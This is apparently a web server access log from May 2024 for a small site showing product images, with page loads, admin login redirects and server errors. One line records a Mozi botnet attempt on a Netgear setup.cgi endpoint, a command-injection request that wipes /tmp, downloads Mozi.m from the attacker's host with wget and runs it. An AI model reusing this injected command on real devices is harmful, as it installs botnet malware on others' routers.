37.201.160.212 - - [15/May/2024:10:42:03 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:37 +0200] "GET / HTTP/1.1" 200 321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:38 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:38 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:39 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:39 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:39 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:40 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:40 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:40 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:40 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:41 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:41 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:41 +0200] "GET / HTTP/1.1" 200 320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:49:45 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:50:20 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
123.8.83.91 - - [15/May/2024:10:52:54 +0200] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://123.8.83.91:48749/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 803 "-" "-"
37.201.160.212 - - [15/May/2024:10:56:26 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:59:17 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:59:36 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:10:59:38 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:02:40 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:08:11 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:13:55 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:15:29 +0200] "GET / HTTP/1.1" 500 803 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:16:22 +0200] "GET / HTTP/1.1" 200 928 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:16:22 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:16:23 +0200] "GET /uploads/10_gummipenis_elfbarus.png HTTP/1.1" 200 8516 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:16:23 +0200] "GET /static/styles/home.css HTTP/1.1" 200 596 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:16:23 +0200] "GET /uploads/1_strawbarry_ice_elfbarus.png HTTP/1.1" 200 61943 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:16:23 +0200] "GET /uploads/10_gummybear_elfbarus.png HTTP/1.1" 200 8516 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:16:27 +0200] "GET /admin HTTP/1.1" 302 649 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:16:27 +0200] "GET /login?next=%2Fadmin HTTP/1.1" 200 1134 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:16:27 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/login?next=%2Fadmin" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:16:32 +0200] "POST /login?next=%2Fadmin HTTP/1.1" 500 452 "http://93.231.130.227/login?next=%2Fadmin" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:17:02 +0200] "GET /login?next=%2Fadmin HTTP/1.1" 200 902 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:17:04 +0200] "GET / HTTP/1.1" 200 927 "http://93.231.130.227/login?next=%2Fadmin" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:17:04 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:17:04 +0200] "GET /static/styles/home.css HTTP/1.1" 200 596 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:17:07 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:17:07 +0200] "GET /static/styles/home.css HTTP/1.1" 200 595 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:20:41 +0200] "GET / HTTP/1.1" 200 928 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:20:41 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:20:41 +0200] "GET /uploads/10_gummipenis_elfbarus.png HTTP/1.1" 304 182 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:20:41 +0200] "GET /uploads/1_strawbarry_ice_elfbarus.png HTTP/1.1" 304 182 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:20:41 +0200] "GET /static/styles/home.css HTTP/1.1" 200 595 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:20:41 +0200] "GET /uploads/10_gummybear_elfbarus.png HTTP/1.1" 304 182 "http://93.231.130.227/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:21:13 +0200] "GET /admin HTTP/1.1" 302 670 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:21:13 +0200] "GET /login?next=%2Fadmin HTTP/1.1" 200 1134 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
37.201.160.212 - - [15/May/2024:11:21:14 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/login?next=%2Fadmin" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
104.28.64.21 - - [15/May/2024:11:21:42 +0200] "GET / HTTP/1.1" 200 928 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:43 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:43 +0200] "GET /uploads/10_gummipenis_elfbarus.png HTTP/1.1" 200 8515 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:43 +0200] "GET /static/styles/home.css HTTP/1.1" 200 596 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:43 +0200] "GET /uploads/10_gummybear_elfbarus.png HTTP/1.1" 200 8515 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:43 +0200] "GET /uploads/1_strawbarry_ice_elfbarus.png HTTP/1.1" 200 61942 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:43 +0200] "GET /favicon.ico HTTP/1.1" 404 418 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:48 +0200] "GET / HTTP/1.1" 200 928 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:48 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:48 +0200] "GET /static/styles/home.css HTTP/1.1" 200 596 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:50 +0200] "GET / HTTP/1.1" 200 927 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:50 +0200] "GET /static/styles/base.css HTTP/1.1" 200 653 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:50 +0200] "GET /static/styles/home.css HTTP/1.1" 200 596 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
104.28.64.21 - - [15/May/2024:11:21:51 +0200] "GET / HTTP/1.1" 200 927 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:51 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:51 +0200] "GET /static/styles/home.css HTTP/1.1" 200 595 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:52 +0200] "GET / HTTP/1.1" 200 927 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:52 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:52 +0200] "GET /static/styles/home.css HTTP/1.1" 200 595 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:53 +0200] "GET / HTTP/1.1" 200 927 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:53 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:53 +0200] "GET /static/styles/home.css HTTP/1.1" 200 595 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:58 +0200] "GET /admin HTTP/1.1" 302 650 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:58 +0200] "GET /login?next=%2Fadmin HTTP/1.1" 200 1134 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:21:59 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/login?next=%2Fadmin" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:22:00 +0200] "GET / HTTP/1.1" 200 927 "http://93.231.130.227/login?next=%2Fadmin" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:22:00 +0200] "GET /static/styles/base.css HTTP/1.1" 200 652 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:22:00 +0200] "GET /static/styles/home.css HTTP/1.1" 200 596 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:22:17 +0200] "GET / HTTP/1.1" 200 928 "-" "WhatsApp/2.24.8.85 i"
104.28.64.22 - - [15/May/2024:11:22:25 +0200] "GET / HTTP/1.1" 200 928 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
37.201.160.212 - - [15/May/2024:11:22:25 +0200] "GET /static/styles/base.css HTTP/1.1" 200 653 "http://93.231.130.227/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
